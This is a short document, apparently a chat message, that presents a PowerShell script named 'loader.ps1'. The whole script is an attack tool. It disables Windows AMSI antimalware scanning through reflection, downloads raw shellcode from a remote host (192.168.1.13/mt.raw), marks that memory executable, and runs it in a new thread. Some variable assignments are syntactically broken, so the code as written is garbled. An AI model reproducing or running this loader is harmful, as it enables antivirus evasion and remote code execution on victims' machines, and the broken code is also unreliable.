### 📁 File unico: `loader.ps1` (può essere lo stesso dell'altro messaggio)

```powershell
[string1] = "System.Management.Automation.Amsi" + "Utils"
[string2] = "amsiInit" + "Failed"
[type]   = [Ref].Assembly.GetType($string1)
$field]  = $type.GetField($string2, [Reflection.BindingFlags]"NonPublic,Static")
$field.SetValue($null, $true)

$data = (New-Object Net.WebClient).DownloadData('http://192.168.1.13/mt.raw')
$size = $data.Length
$addr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($size)
[System.Runtime.InteropServices.Marshal]::Copy($data, 0, $addr, $size)

Add-Type -MemberDefinition @'
[DllImport("kernel32.dll")]
public static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);
'@ -Name NativeMethods -Namespace Win32
[Win32.NativeMethods]::VirtualProtect($addr, [uint32]$size, 0x40, [ref][uint32]0)

$kernel32Type = Add-Type -MemberDefinition @'
[DllImport("kernel32.dll")]
public static extern IntPtr CreateThread(uint lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
[DllImport("kernel32.dll")]
public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);
'@ -Name Kernel32Functions -Namespace Win32

$hThread = [Win32.Kernel32Functions]::CreateThread(0, 0, $addr, 0, 0, 0)
[Win32.Kernel32Functions]::WaitForSingleObject($hThread, 0xFFFFFFFF)
